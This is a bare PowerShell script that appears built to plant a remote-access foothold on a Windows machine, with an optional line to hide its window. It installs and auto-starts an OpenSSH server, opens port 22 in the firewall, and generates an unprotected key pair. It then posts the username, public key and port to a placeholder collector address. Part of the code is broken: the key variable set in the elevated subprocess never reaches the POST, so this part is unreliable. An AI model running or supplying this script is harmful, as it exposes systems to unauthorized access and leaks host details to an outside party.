$hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
# [WinAPI]::ShowWindow($hwnd, 0)
$opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
if ($opensshServer.State -ne 'Installed') {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
}
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
$sshdConfigPath = "C:\ProgramData\ssh\sshd_config"
if (-not (Test-Path $sshdConfigPath)) {
    @"
Port 22
AddressFamily any
ListenAddress 0.0.0.0
ListenAddress ::
HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key
HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key
AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
Subsystem sftp sftp-server.exe
PubkeyAuthentication yes
PasswordAuthentication no
"@ | Set-Content $sshdConfigPath
}
Restart-Service sshd
$firewallRule = Get-NetFirewallRule -DisplayName "Allow SSH"
if (-not $firewallRule) {
    New-NetFirewallRule -Name "AllowSSH" -DisplayName "Allow SSH" -Protocol TCP -LocalPort 22 -Action Allow -Direction Inbound
}
$sshDir = "$HOME\.ssh"
if (-not (Test-Path -Path $sshDir)) {
    New-Item -ItemType Directory -Force -Path $sshDir
}
Start-Process powershell -Verb runAs -ArgumentList {
    $sshKey = "$HOME\.ssh\id_rsa"
    $sshKeyPub = "$HOME\.ssh\id_rsa.pub"
    if (-not (Test-Path -Path $sshKey)) {
        ssh-keygen -t rsa -b 2048 -f $sshKey -q -N ''
    }
    if (Test-Path -Path $sshKeyPub) {
        $publicKey = Get-Content -Path $sshKeyPub -Raw
        Set-Content "$HOME\.ssh\authorized_keys" $publicKey
    } else {
        $publicKey = "[Error: Public key not generated]"
    }
}
$username = $env:USERNAME
$port = 22
$postUri = "http://IP:PORT/host"
$postData = @{
    "Username" = $username
    "PublicKey" = $publicKey
    "Port" = $port
} | ConvertTo-Json
Invoke-RestMethod -Uri $postUri -Method Post -Body $postData -ContentType 'application/json'
